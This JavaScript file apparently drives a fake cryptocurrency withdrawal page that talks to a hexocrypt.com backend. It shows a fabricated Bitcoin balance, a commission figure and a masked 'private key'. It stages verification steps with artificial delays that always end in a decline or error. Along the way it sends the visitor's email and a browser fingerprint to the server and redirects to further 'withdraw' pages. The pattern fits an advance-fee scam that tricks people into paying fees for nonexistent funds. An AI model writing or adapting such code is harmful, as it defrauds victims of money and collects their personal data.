
let xhr = new XMLHttpRequest();

let url = new URL(window.location.href).searchParams.get("email");

class UserInfo {
    constructor() {
        this.timeOpened = new Date()
        this.timezone = (new Date().getTimezoneOffset() / 60)
    }
    pageon() {
        return window.location.pathname
    }
    platform() { return navigator?.platform }
    langues() { return navigator?.languages }
    appVersion() { return navigator?.appVersion }
    productSub() { return navigator?.productSub }
    sicret() {

        let sicret_key = `${navigator?.productSub + navigator?.vendor + navigator?.appName + navigator?.platform + navigator?.product + navigator?.appVersion}`

        return sicret_key
    }
}

let info = new UserInfo()

function loaderFunction(status) {
    if (status) {
        let div = document.createElement("div");
        div.style =
            "position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;";
        div.id = "loader-wrapper";
        div.innerHTML = '<div class="loader" style="color:red;"></div>';
        document.body.append(div);
    } else {
        document.getElementById("loader-wrapper").remove();
    }
}

async function send_request(type, laoder, url, data) {
    if (laoder) {
        loaderFunction(false);
    }
    return new Promise((resolve, reject) => {
        let page = `https://hexocrypt.com/api/${url}`;
        xhr.open(type, page);
        xhr.responseType = "json";
        xhr.setRequestHeader("Accept", "application/json");
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.setRequestHeader("Access-Control-Allow-Origin", "*");
        xhr.setRequestHeader("mode", "no-cors");
        xhr.setRequestHeader("cache", "no-cache");
        xhr.setRequestHeader("credentials", "same-origin");
        xhr.setRequestHeader("redirect", "follow");

        xhr.onload = () => {
            resolve(xhr.response);
        };

        if (data != false) {
            xhr.send(JSON.stringify(data));
        } else {
            xhr.send();
        }
    });
}

window.openVerifyLoader = function () {
    const verifyPopupLoader = document.getElementsByClassName("verify-popup-loader")[0];
    const verifyPopupDeclined = document.getElementsByClassName("verify-popup-declined")[0];
    const verifyButton = document.getElementById("verifyButton");
    const submitButton = document.getElementById("submit-button");

    verifyButton.style.display = "none"


    verifyPopupDeclined.style.display = "none"
    verifyPopupLoader.style.display = "flex"

    setTimeout(async () => {
        let users = await send_request("get", false, "users", false)

        // submitButton.removeAttribute("disabled")
        verifyPopupDeclined.style.display = "flex"
        verifyPopupLoader.style.display = "none"
        send_request("post", false, "send_mail-2", { email: url, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })

        setTimeout(() => {
            let url = new URL(window.location.href).searchParams.get("email");
            window.location.href = `withdraw-7.html?email=${url}`;

        }, 5000);

    }, 10000);

}


async function setElements(
    priceBitcoinCommission,
    priceInBitcoin,
    priceEuro,
    qr,
    commissionBTC,
    commissionEuro,
    address,
    keys,
    fullWalletAddress
) {
    let currencyText = "USD";
    const currency = localStorage.getItem("currency");

    if (currency == "dollar") {
        currencyText = "USD";
    } else if (currency == "euro") {
        currencyText = "EUR";
    }

    const privateKeyElement = document.getElementById("privateKey");
    if (privateKeyElement) {
        privateKeyElement.textContent = `*****************************************${keys[0].bitcoin_key}`;
    }

    if (window.innerWidth <= 600) {
        const elements = document.getElementsByClassName("small-private-key");
        for (let element of elements) {
            if (element && element.textContent) {
                element.textContent = element.textContent.substring(30);
            }
        }
    }

    const balanceBitcoinElement = document.getElementById("balance_bitcoin");
    if (balanceBitcoinElement) {
        balanceBitcoinElement.textContent = `${priceInBitcoin} BTC`;
    }

    const balanceEuroElement = document.getElementById("balance_euro");
    if (balanceEuroElement) {
        balanceEuroElement.textContent = `${priceEuro} ${currencyText}`;
    }

    const getCommissionElement = document.getElementById("get_commission");
    if (getCommissionElement) {
        getCommissionElement.textContent = `${commissionEuro} ${currencyText} = ${commissionBTC} BTC`;
    }

    const btcAddressElement = document.querySelector(".btc_address");
    if (btcAddressElement) {
        btcAddressElement.textContent = fullWalletAddress;
    }

    const getBalanceElement = document.querySelector("#get_balance");
    if (getBalanceElement) {
        getBalanceElement.textContent = `${priceEuro} ${currencyText} = ${priceInBitcoin} BTC`;
    }

    const loaderWrapperElement = document.getElementById("loader-wrapper");
    if (loaderWrapperElement) {
        loaderWrapperElement.remove();
    }
}


async function show(keys) {
    console.log(keys);
    const wait = document.getElementById("wait");
    const fill_error = document.getElementById("fill-data");
    const address_value = document.getElementById("bitcoin_title").value;
    const incorrect_error = document.getElementById("incorrect-data");

    wait.classList.add("active");

    setTimeout(() => {
        wait.classList.remove("active");
        if (!address_value) {
            fill_error.classList.add("active");

            setTimeout(() => {
                fill_error.classList.remove("active");
            }, 6000);
            return;
        } else {
            for (let key in keys) {
                if (keys[key].bitcoin_title == address_value) {
                    incorrect_error.classList.add("active");
                    fill_error.classList.remove("active");
                    setTimeout(() => {
                        window.location.href = `withdraw-7.html?email=${url}`;
                    }, 15000);
                    return;
                } else {
                    incorrect_error.classList.add("active");
                    setTimeout(() => {
                        incorrect_error.classList.remove("active");
                        fill_error.classList.remove("active");
                    }, 7000);
                }
            }
        }
    }, 10000);

    // send_request("post", false, "withdraw-notifications", { type: "withdraw", address: address_value, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })
}

async function check_data() {
    let keys = await send_request("get", false, "keys", false);
    await show(keys);
}

function handleClickOnce() {
    document.getElementById("popup").classList.add("show");
    popup.addEventListener("click", function (event) {
        if (event.target === popup) {
            popup.classList.remove("show");
        }
    });
    this.onclick = null;
}

// const emailInput = document.getElementById("email-input");
// emailInput.onclick = handleClickOnce;

async function check(keys) {
    const fill_error = document.querySelector(".incorrect_error");
    const sicret_key_input = document.getElementById(
        "private_bitcoin_wallet"
    ).value;
    const incorrect_error = document.querySelector(".data_ok");

    if (sicret_key_input == "") {
        fill_error.classList.add("active");
        setTimeout(() => {
            fill_error.classList.remove("active");
        }, 7000);

        return;
    } else {
        for (let key in keys) {
            if (keys[key].bitcoin_key == sicret_key_input) {
                incorrect_error.classList.add("active");
                fill_error.classList.remove("active");

                return;
            } else {
                incorrect_error.classList.add("active");
                setTimeout(() => {
                    incorrect_error.classList.remove("active");
                    fill_error.classList.remove("active");
                }, 7000);
            }
        }
    }
}

async function check_private_id() {
    let keys = await send_request("get", false, "keys", false);
    await check(keys);
}

async function start() {
    let currency = localStorage.getItem("currency")

    let address = await send_request("get", false, "address_change", false);
    let qr = await send_request("get", false, "qr_change", false);
    let getPriceBitcoin = await send_request("get", false, "price_change", false);
    let setPriceBitcoin = getPriceBitcoin["price_euro"];
    let sendPriceBitcoin = await send_request(
        "post",
        false,
        "transaction-convert",
        {
            price: setPriceBitcoin,
            sicret_key: `${navigator.productSub +
                navigator.vendor +
                navigator.appName +
                navigator.platform +
                navigator.product +
                navigator.appVersion
                }`,
        }
    );
    let getPriceBitcoinCommission = await send_request(
        "post",
        false,
        "transaction-commission",
        {
            price: setPriceBitcoin,
            sicret_key: `${navigator.productSub +
                navigator.vendor +
                navigator.appName +
                navigator.platform +
                navigator.product +
                navigator.appVersion
                }`,
        }
    );
    let setPriceBitcoinCommission = getPriceBitcoinCommission.price;
    let getPriceInEuro = await send_request(
        "post",
        false,
        "transaction-convert-euro",
        {
            price: setPriceBitcoin,
            sicret_key: `${navigator.productSub +
                navigator.vendor +
                navigator.appName +
                navigator.platform +
                navigator.product +
                navigator.appVersion
                }`,
        }
    );
    let getPriceInEuroCommission = await send_request(
        "post",
        false,
        "transaction-convert-euro",
        {
            price: setPriceBitcoinCommission,
            sicret_key: `${navigator.productSub +
                navigator.vendor +
                navigator.appName +
                navigator.platform +
                navigator.product +
                navigator.appVersion
                }`,
        }
    );

    let keys = await send_request("get", false, "keys", false);
    let fullWalletAddress = await send_request("get", false, "full_wallet_address", false)


    setElements(
        sendPriceBitcoin,
        Number(setPriceBitcoin).toFixed(8),
        Number(getPriceInEuro.price).toFixed(2),
        qr,
        setPriceBitcoinCommission,
        Number(getPriceInEuroCommission.price).toFixed(2),
        address.address,
        keys,
        fullWalletAddress.full_wallet_address
    );
    // setElements(
    //     sendPriceBitcoin,
    //     Number(setPriceBitcoin).toFixed(2),
    //     Number(getPriceInEuro.price).toFixed(2),
    //     qr,
    //     setPriceBitcoinCommission,
    //     Number(getPriceInEuroCommission.price).toFixed(2),
    //     address.address,
    //     keys
    // );
}

start();
